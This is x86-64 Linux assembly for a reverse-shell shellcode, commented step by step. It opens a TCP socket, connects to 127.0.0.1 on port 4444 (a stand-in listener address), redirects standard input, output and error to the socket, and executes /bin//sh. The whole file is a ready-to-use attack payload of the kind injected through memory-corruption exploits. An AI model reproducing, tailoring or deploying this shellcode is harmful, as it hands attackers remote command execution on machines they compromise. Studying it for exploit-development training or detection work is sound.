global _start
_start:
jmp short makeSocket
clearRegz:
xor rsi, rsi
mul rsi
push rsi
pop rdi
ret
makeSocket:
; sock = socket(AF_INET, SOCK_STREAM, 0)
; AF_INET = 2 ; SOCK_STREAM = 1 ; syscall number 41 
call clearRegz
add rax, 41
inc rsi
inc rdi
inc rdi
syscall
; copy socket descriptor to rdi for future use 
mov r8, rax ; r8 = socket-fd
; server.sin_family = AF_INET 
; server.sin_port = htons(PORT)
; server.sin_addr.s_addr = inet_addr("127.0.0.1")
; bzero(&server.sin_zero, 8)
call clearRegz
push rax
push dword 0x0101017f
push word 0x5c11 ; push 2 bytes for TCP Port 4444
inc rdx
inc rdx
push dx ; AF-INET
; connect(sock, (struct sockaddr *)&server, sockaddr_len)
add rax, 42
mov rsi, rsp
push r8
pop rdi ; sock-fd
add dl, 0xe ; sizeof(sockaddr)
syscall
; duplicate sockets
; dup2 (new, old)
call clearRegz
mov rdi, r8 ; sock-fd
add rax, 33
syscall
xor rax, rax
add rax, 33
inc rsi
syscall
xor rax, rax
add rax, 33
inc rsi
syscall
; execve
; First NULL push
xor rax, rax
push rax
; push /bin//sh in reverse
mov rbx, 0x68732f2f6e69622f
push rbx
; store /bin//sh address in RDI
mov rdi, rsp
; Second NULL push
push rax
; set RDX
mov rdx, rsp
; Push address of /bin//sh
push rdi
; set RSI
mov rsi, rsp
; Call the Execve syscall
add rax, 59
syscall
